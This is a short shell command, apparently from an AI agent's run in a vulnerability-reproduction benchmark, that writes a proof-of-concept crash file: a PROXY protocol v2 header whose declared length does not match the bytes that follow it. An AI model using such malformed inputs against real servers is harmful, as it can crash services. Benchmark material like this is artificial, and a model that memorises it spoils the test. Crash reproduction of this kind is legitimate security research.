cd /CybinGym_workdir; python3 -c "
import struct
sig = b'\r\n\r\n\x00\r\nQUIT\n'
ver_cmd = b'\x21'
fam = b'\x11'
length = struct.pack('>H', 0x24)
hdr = sig + ver_cmd + fam + length
payload = b'GET / HTTP/1.1\r\n\r\n'
data = hdr + payload
open('/CybinGym_workdir/poc_crash','wb').write(data)
print('wrote', len(data), 'bytes')
"
ls -la /CybinGym_workdir/poc_crash; xxd /CybinGym_workdir/poc_crash
